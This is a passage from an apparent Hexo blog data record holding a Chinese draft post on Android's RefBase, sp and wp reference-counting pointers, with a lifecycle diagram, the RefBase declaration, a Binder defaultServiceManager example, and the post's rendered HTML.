}\n\n    typedef RefBase basetype;\n\nprotected:\n                            RefBase();\n    virtual                 ~RefBase();\n    \n    //! Flags for extendObjectLifetime()\n    enum {\n        OBJECT_LIFETIME_STRONG  = 0x0000,\n        OBJECT_LIFETIME_WEAK    = 0x0001,\n        OBJECT_LIFETIME_MASK    = 0x0001\n    };\n    \n            void            extendObjectLifetime(int32_t mode);\n            \n    //! Flags for onIncStrongAttempted()\n    enum {\n        FIRST_INC_STRONG = 0x0001\n    };\n    \n    // Invoked after creation of initial strong pointer/reference.\n    virtual void            onFirstRef();\n    // Invoked when either the last strong reference goes away, or we need to undo\n    // the effect of an unnecessary onIncStrongAttempted.\n    virtual void            onLastStrongRef(const void* id);\n    // Only called in OBJECT_LIFETIME_WEAK case.  Returns true if OK to promote to\n    // strong reference. May have side effects if it returns true.\n    // The first flags argument is always FIRST_INC_STRONG.\n    // TODO: Remove initial flag argument.\n    virtual bool            onIncStrongAttempted(uint32_t flags, const void* id);\n    // Invoked in the OBJECT_LIFETIME_WEAK case when the last reference of either\n    // kind goes away.  Unused.\n    // TODO: Remove.\n    virtual void            onLastWeakRef(const void* id);\n\nprivate:\n    friend class weakref_type;\n    class weakref_impl;\n    \n                            RefBase(const RefBase& o);\n            RefBase&        operator=(const RefBase& o);\n\nprivate:\n    friend class ReferenceMover;\n\n    static void renameRefs(size_t n, const ReferenceRenamer& renamer);\n\n    static void renameRefId(weakref_type* ref,\n            const void* old_id, const void* new_id);\n\n    static void renameRefId(RefBase* ref,\n            const void* old_id, const void* new_id);\n\n        weakref_impl* const mRefs;\n};\n\n\n\n```\n\n## SP\nsp<T> 是 Android Binder IPC 系统中的一个智能指针模板，定义在 android::sp<T> 中，类似于 C++ 标准库的 std::shared_ptr<T>，但它是 Android 自己实现的强引用指针（Smart Pointer，sp = Smart Pointer）。\n\n\n举例说明 ：\nframeworks/native/libs/binder/include/private/binder/Static.h \n```cpp\nextern Mutex gDefaultServiceManagerLock;\nextern sp<IServiceManager> gDefaultServiceManager;//附录1\n#ifndef __ANDROID_VNDK__\nextern sp<IPermissionController> gPermissionController;\n#endif\nextern bool gSystemBootCompleted;\n```\n```cpp\nsp<IServiceManager> defaultServiceManager()\n{\n    if (gDefaultServiceManager != nullptr) return gDefaultServiceManager;\n\n    {\n        AutoMutex _l(gDefaultServiceManagerLock);\n        while (gDefaultServiceManager == nullptr) {\n            gDefaultServiceManager = interface_cast<IServiceManager>(\n                ProcessState::self()->getContextObject(nullptr));\n            if (gDefaultServiceManager == nullptr)\n                sleep(1);\n        }\n    }\n\n    return gDefaultServiceManager;\n}\n```\n\nWP\n\n\n## 附录\n### 1.为什么将gDefaultServiceManager放在Static.h中\n\t•\t这样你就可以在多个 .cpp 文件中 #include \"Static.h\"，就能用 gDefaultServiceManager，不会引起多重定义错误（Multiple Definition Error）。\n\t•\t项目中如果有多个类似 gSomething 的共享变量，都可以统一声明在 Static.h 中，维护方便。\n\t•\t避免在各个头文件中乱声明，形成“头文件污染”。\n\t•\t让别人一看 Static.h 就知道项目里有哪些共享变量。","source":"_drafts/android_framework_pointer.md","raw":"title: android强弱引用指针\nauthor: nuoen\ntags: []\ncategories:\n  - cpp \n  - android\n  - framework\ndate: 2025-03-29 21:39:00\n\n# android强弱引用指针\n```\n                    ┌───────────────────────────────┐\n                    │ new MyObject();               │\n                    │ → RefBase::init()             │\n                    │ → mStrong = 0, mWeak = 0      │\n                    └──────────────┬────────────────┘\n                                   │\n                     ┌────────────▼────────────┐\n                     │ sp<MyObject> strongRef  │  ← 构造时调用 incStrong()\n                     └────────────┬────────────┘\n                                   │\n                     +1           ▼           +1\n              mStrong = 1     MyObject()     mWeak = 1  ← RefBase 中自动创建弱引用计数\n                                   │\n                                   ▼\n                          ┌──────────────┐\n                          │ wp<MyObject> │  ← 构造时调用 incWeak()\n                          └──────┬───────┘\n                                 │\n                     +1         ▼         +0\n              mStrong = 1   still alive   mWeak = 2\n\n   ┌────────────┐\n   │ clear sp<> │ → decStrong()，mStrong -1 = 0\n   └────┬───────┘\n        │\n        ▼\n  ┌──────────────┐\n  │ 析构 MyObject │  ← 对象析构（~MyObject）\n  └────┬─────────┘\n       │\n       ▼\n  ┌──────────────┐\n  │ promote()    │ ← wp.promote()\n  └────┬─────────┘\n       │\n       ▼\n  mStrong == 0 → 返回 nullptr\n  对象已被销毁，无法再访问\n\n最终：\n  mStrong = 0\n  mWeak = 1（直到 wp 也析构）\n\n```\n## RefBase\n```cpp\nclass RefBase\n{\npublic:\n            void            incStrong(const void* id) const;\n            void            decStrong(const void* id) const;\n            void            forceIncStrong(const void* id) const;\n            //! DEBUGGING ONLY: Get current strong ref count.\n            int32_t         getStrongCount() const;\n\n    class weakref_type\n    {\n    public:\n        RefBase*            refBase() const;\n\n        void                incWeak(const void* id);\n        void                decWeak(const void* id);\n\n        // acquires a strong reference if there is already one.\n        bool                attemptIncStrong(const void* id);\n\n        // acquires a weak reference if there is already one.\n        // This is not always safe. see ProcessState.cpp and BpBinder.cpp\n        // for proper use.\n        bool                attemptIncWeak(const void* id);\n\n        //! DEBUGGING ONLY: Get current weak ref count.\n        int32_t             getWeakCount() const;\n\n        //! DEBUGGING ONLY: Print references held on object.\n        void                printRefs() const;\n\n        //! DEBUGGING ONLY: Enable tracking for this object.\n        // enable -- enable/disable tracking\n        // retain -- when tracking is enable, if true, then we save a stack trace\n        //           for each reference and dereference; when retain == false, we\n        //           match up references and dereferences and keep only the\n        //           outstanding ones.\n\n        void                trackMe(bool enable, bool retain);\n    };\n\n            weakref_type*   createWeak(const void* id) const;\n            \n            weakref_type*   getWeakRefs() const;\n\n            //! DEBUGGING ONLY: Print references held on object.\n    inline  void            printRefs() const { getWeakRefs()->printRefs(); }\n\n            //! DEBUGGING ONLY: Enable tracking of object.\n    inline  void            trackMe(bool enable, bool retain)\n    { \n        getWeakRefs()->trackMe(enable, retain); \n    }\n\n    typedef RefBase basetype;\n\nprotected:\n                            RefBase();\n    virtual                 ~RefBase();\n    \n    //! Flags for extendObjectLifetime()\n    enum {\n        OBJECT_LIFETIME_STRONG  = 0x0000,\n        OBJECT_LIFETIME_WEAK    = 0x0001,\n        OBJECT_LIFETIME_MASK    = 0x0001\n    };\n    \n            void            extendObjectLifetime(int32_t mode);\n            \n    //! Flags for onIncStrongAttempted()\n    enum {\n        FIRST_INC_STRONG = 0x0001\n    };\n    \n    // Invoked after creation of initial strong pointer/reference.\n    virtual void            onFirstRef();\n    // Invoked when either the last strong reference goes away, or we need to undo\n    // the effect of an unnecessary onIncStrongAttempted.\n    virtual void            onLastStrongRef(const void* id);\n    // Only called in OBJECT_LIFETIME_WEAK case.  Returns true if OK to promote to\n    // strong reference. May have side effects if it returns true.\n    // The first flags argument is always FIRST_INC_STRONG.\n    // TODO: Remove initial flag argument.\n    virtual bool            onIncStrongAttempted(uint32_t flags, const void* id);\n    // Invoked in the OBJECT_LIFETIME_WEAK case when the last reference of either\n    // kind goes away.  Unused.\n    // TODO: Remove.\n    virtual void            onLastWeakRef(const void* id);\n\nprivate:\n    friend class weakref_type;\n    class weakref_impl;\n    \n                            RefBase(const RefBase& o);\n            RefBase&        operator=(const RefBase& o);\n\nprivate:\n    friend class ReferenceMover;\n\n    static void renameRefs(size_t n, const ReferenceRenamer& renamer);\n\n    static void renameRefId(weakref_type* ref,\n            const void* old_id, const void* new_id);\n\n    static void renameRefId(RefBase* ref,\n            const void* old_id, const void* new_id);\n\n        weakref_impl* const mRefs;\n};\n\n\n\n```\n\n## SP\nsp<T> 是 Android Binder IPC 系统中的一个智能指针模板，定义在 android::sp<T> 中，类似于 C++ 标准库的 std::shared_ptr<T>，但它是 Android 自己实现的强引用指针（Smart Pointer，sp = Smart Pointer）。\n\n\n举例说明 ：\nframeworks/native/libs/binder/include/private/binder/Static.h \n```cpp\nextern Mutex gDefaultServiceManagerLock;\nextern sp<IServiceManager> gDefaultServiceManager;//附录1\n#ifndef __ANDROID_VNDK__\nextern sp<IPermissionController> gPermissionController;\n#endif\nextern bool gSystemBootCompleted;\n```\n```cpp\nsp<IServiceManager> defaultServiceManager()\n{\n    if (gDefaultServiceManager != nullptr) return gDefaultServiceManager;\n\n    {\n        AutoMutex _l(gDefaultServiceManagerLock);\n        while (gDefaultServiceManager == nullptr) {\n            gDefaultServiceManager = interface_cast<IServiceManager>(\n                ProcessState::self()->getContextObject(nullptr));\n            if (gDefaultServiceManager == nullptr)\n                sleep(1);\n        }\n    }\n\n    return gDefaultServiceManager;\n}\n```\n\nWP\n\n\n## 附录\n### 1.为什么将gDefaultServiceManager放在Static.h中\n\t•\t这样你就可以在多个 .cpp 文件中 #include \"Static.h\"，就能用 gDefaultServiceManager，不会引起多重定义错误（Multiple Definition Error）。\n\t•\t项目中如果有多个类似 gSomething 的共享变量，都可以统一声明在 Static.h 中，维护方便。\n\t•\t避免在各个头文件中乱声明，形成“头文件污染”。\n\t•\t让别人一看 Static.h 就知道项目里有哪些共享变量。","slug":"android_framework_pointer","published":0,"date":"2025-03-29T13:38:12.805Z","updated":"2025-03-30T06:56:29.424Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risx0002v8fyhey8hw9a","content":"<p>title: android强弱引用指针<br>author: nuoen<br>tags: []<br>categories:</p>\n<ul>\n<li>cpp </li>\n<li>android</li>\n<li>framework<br>date: 2025-03-29 21:39:00</li>\n</ul>\n<h1 id=\"android强弱引用指针\"><a href=\"#android强弱引用指针\" class=\"headerlink\" title=\"android强弱引用指针\"></a>android强弱引用指针</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">                    ┌───────────────────────────────┐</span><br><span class=\"line\">                    │ new MyObject();               │</span><br><span class=\"line\">                    │ → RefBase::init()             │</span><br><span class=\"line\">                    │ → mStrong = 0, mWeak = 0      │</span><br><span class=\"line\">                    └──────────────┬────────────────┘</span><br><span class=\"line\">                                   │</span><br><span class=\"line\">                     ┌────────────▼────────────┐</span><br><span class=\"line\">                     │ sp&lt;MyObject&gt; strongRef  │  ← 构造时调用 incStrong()</span><br><span class=\"line\">                     └────────────┬────────────┘</span><br><span class=\"line\">                                   │</span><br><span class=\"line\">                     +1           ▼           +1</span><br><span class=\"line\">              mStrong = 1     MyObject()     mWeak = 1  ← RefBase 中自动创建弱引用计数</span><br><span class=\"line\">                                   │</span><br><span class=\"line\">                                   ▼</span><br><span class=\"line\">                          ┌──────────────┐</span><br><span class=\"line\">                          │ wp&lt;MyObject&gt; │  ← 构造时调用 incWeak()</span><br><span class=\"line\">                          └──────┬───────┘</span><br><span class=\"line\">                                 │</span><br><span class=\"line\">                     +1         ▼         +0</span><br><span class=\"line\">              mStrong = 1   still alive   mWeak = 2</span><br><span class=\"line\"></span><br><span class=\"line\">   ┌────────────┐</span><br><span class=\"line\">   │ clear sp&lt;&gt; │ → decStrong()，mStrong -1 = 0</span><br><span class=\"line\">   └────┬───────┘</span><br><span class=\"line\">        │</span><br><span class=\"line\">        ▼</span><br><span class=\"line\">  ┌──────────────┐</span><br><span class=\"line\">  │ 析构 MyObject │  ← 对象析构（~MyObject）</span><br><span class=\"line\">  └────┬─────────┘</span><br><span class=\"line\">       │</span><br><span class=\"line\">       ▼</span><br><span class=\"line\">  ┌──────────────┐</span><br><span class=\"line\">  │ promote()    │ ← wp.promote()</span><br><span class=\"line\">  └────┬─────────┘</span><br><span class=\"line\">       │</span><br><span class=\"line\">       ▼</span><br><span class=\"line\">  mStrong == 0 → 返回 nullptr</span><br><span class=\"line\">  对象已被销毁，无法再访问</span><br><span class=\"line\"></span><br><span class=\"line\">最终：</span><br><span class=\"line\">  mStrong = 0</span><br><span class=\"line\">  mWeak = 1（直到 wp 也析构）</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"RefBase\"><a href=\"#RefBase\" class=\"headerlink\" title=\"RefBase\"></a>RefBase</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RefBase</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">            <span class=\"function\"><span class=\"type\">void</span>            <span class=\"title\">incStrong</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\">            <span class=\"function\"><span class=\"type\">void</span>            <span class=\"title\">decStrong</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\">            <span class=\"function\"><span class=\"type\">void</span>            <span class=\"title\">forceIncStrong</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\">            <span class=\"comment\">//! DEBUGGING ONLY: Get current strong ref count.</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"type\">int32_t</span>         <span class=\"title\">getStrongCount</span><span class=\"params\">()</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">weakref_type</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        <span class=\"function\">RefBase*            <span class=\"title\">refBase</span><span class=\"params\">()</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span>                <span class=\"title\">incWeak</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span>                <span class=\"title\">decWeak</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// acquires a strong reference if there is already one.</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">bool</span>                <span class=\"title\">attemptIncStrong</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// acquires a weak reference if there is already one.</span></span><br><span class=\"line\">        <span class=\"comment\">// This is not always safe. see ProcessState.cpp and BpBinder.cpp</span></span><br><span class=\"line\">        <span class=\"comment\">// for proper use.</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">bool</span>                <span class=\"title\">attemptIncWeak</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//! DEBUGGING ONLY: Get current weak ref count.</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">int32_t</span>             <span class=\"title\">getWeakCount</span><span class=\"params\">()</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//! DEBUGGING ONLY: Print references held on object.</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span>                <span class=\"title\">printRefs</span><span class=\"params\">()</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//! DEBUGGING ONLY: Enable tracking for this object.</span></span><br><span class=\"line\">        <span class=\"comment\">// enable -- enable/disable tracking</span></span><br><span class=\"line\">        <span class=\"comment\">// retain -- when tracking is enable, if true, then we save a stack trace</span></span><br><span class=\"line\">        <span class=\"comment\">//           for each reference and dereference; when retain == false, we</span></span><br><span class=\"line\">        <span class=\"comment\">//           match up references and dereferences and keep only the</span></span><br><span class=\"line\">        <span class=\"comment\">//           outstanding ones.</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span>                <span class=\"title\">trackMe</span><span class=\"params\">(<span class=\"type\">bool</span> enable, <span class=\"type\">bool</span> retain)</span></span>;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"function\">weakref_type*   <span class=\"title\">createWeak</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"function\">weakref_type*   <span class=\"title\">getWeakRefs</span><span class=\"params\">()</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//! DEBUGGING ONLY: Print references held on object.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span>  <span class=\"type\">void</span>            <span class=\"title\">printRefs</span><span class=\"params\">()</span> <span class=\"type\">const</span> </span>&#123; <span class=\"built_in\">getWeakRefs</span>()-&gt;<span class=\"built_in\">printRefs</span>(); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//! DEBUGGING ONLY: Enable tracking of object.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span>  <span class=\"type\">void</span>            <span class=\"title\">trackMe</span><span class=\"params\">(<span class=\"type\">bool</span> enable, <span class=\"type\">bool</span> retain)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123; </span><br><span class=\"line\">        <span class=\"built_in\">getWeakRefs</span>()-&gt;<span class=\"built_in\">trackMe</span>(enable, retain); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">typedef</span> RefBase basetype;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">protected</span>:</span><br><span class=\"line\">                            <span class=\"built_in\">RefBase</span>();</span><br><span class=\"line\">    <span class=\"keyword\">virtual</span>                 ~<span class=\"built_in\">RefBase</span>();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//! Flags for extendObjectLifetime()</span></span><br><span class=\"line\">    <span class=\"keyword\">enum</span> &#123;</span><br><span class=\"line\">        OBJECT_LIFETIME_STRONG  = <span class=\"number\">0x0000</span>,</span><br><span class=\"line\">        OBJECT_LIFETIME_WEAK    = <span class=\"number\">0x0001</span>,</span><br><span class=\"line\">        OBJECT_LIFETIME_MASK    = <span class=\"number\">0x0001</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"function\"><span class=\"type\">void</span>            <span class=\"title\">extendObjectLifetime</span><span class=\"params\">(<span class=\"type\">int32_t</span> mode)</span></span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">    <span class=\"comment\">//! Flags for onIncStrongAttempted()</span></span><br><span class=\"line\">    <span class=\"keyword\">enum</span> &#123;</span><br><span class=\"line\">        FIRST_INC_STRONG = <span class=\"number\">0x0001</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// Invoked after creation of initial strong pointer/reference.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span>            <span class=\"title\">onFirstRef</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// Invoked when either the last strong reference goes away, or we need to undo</span></span><br><span class=\"line\">    <span class=\"comment\">// the effect of an unnecessary onIncStrongAttempted.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span>            <span class=\"title\">onLastStrongRef</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// Only called in OBJECT_LIFETIME_WEAK case.  Returns true if OK to promote to</span></span><br><span class=\"line\">    <span class=\"comment\">// strong reference. May have side effects if it returns true.</span></span><br><span class=\"line\">    <span class=\"comment\">// The first flags argument is always FIRST_INC_STRONG.</span></span><br><span class=\"line\">    <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Remove initial flag argument.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">bool</span>            <span class=\"title\">onIncStrongAttempted</span><span class=\"params\">(<span class=\"type\">uint32_t</span> flags, <span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// Invoked in the OBJECT_LIFETIME_WEAK case when the last reference of either</span></span><br><span class=\"line\">    <span class=\"comment\">// kind goes away.  Unused.</span></span><br><span class=\"line\">    <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Remove.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span>            <span class=\"title\">onLastWeakRef</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"keyword\">friend</span> <span class=\"keyword\">class</span> <span class=\"title class_\">weakref_type</span>;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">weakref_impl</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">                            <span class=\"built_in\">RefBase</span>(<span class=\"type\">const</span> RefBase&amp; o);</span><br><span class=\"line\">            RefBase&amp;        <span class=\"keyword\">operator</span>=(<span class=\"type\">const</span> RefBase&amp; o);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"keyword\">friend</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ReferenceMover</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">renameRefs</span><span class=\"params\">(<span class=\"type\">size_t</span> n, <span class=\"type\">const</span> ReferenceRenamer&amp; renamer)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">renameRefId</span><span class=\"params\">(weakref_type* ref,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">            <span class=\"type\">const</span> <span class=\"type\">void</span>* old_id, <span class=\"type\">const</span> <span class=\"type\">void</span>* new_id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">renameRefId</span><span class=\"params\">(RefBase* ref,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">            <span class=\"type\">const</span> <span class=\"type\">void</span>* old_id, <span class=\"type\">const</span> <span class=\"type\">void</span>* new_id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        weakref_impl* <span class=\"type\">const</span> mRefs;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"SP\"><a href=\"#SP\" class=\"headerlink\" title=\"SP\"></a>SP</h2><p>sp<T> 是 Android Binder IPC 系统中的一个智能指针模板，定义在 android::sp<T> 中，类似于 C++ 标准库的 std::shared_ptr<T>，但它是 Android 自己实现的强引用指针（Smart Pointer，sp = Smart Pointer）。</p>\n<p>举例说明 ：<br>frameworks/native/libs/binder/include/private/binder/Static.h </p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> Mutex gDefaultServiceManagerLock;</span><br><span class=\"line\"><span class=\"keyword\">extern</span> sp&lt;IServiceManager&gt; gDefaultServiceManager;<span class=\"comment\">//附录1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> __ANDROID_VNDK__</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> sp&lt;IPermissionController&gt; gPermissionController;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">bool</span> gSystemBootCompleted;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">sp&lt;IServiceManager&gt; <span class=\"title\">defaultServiceManager</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (gDefaultServiceManager != <span class=\"literal\">nullptr</span>) <span class=\"keyword\">return</span> gDefaultServiceManager;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        AutoMutex _l(gDefaultServiceManagerLock);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (gDefaultServiceManager == <span class=\"literal\">nullptr</span>) 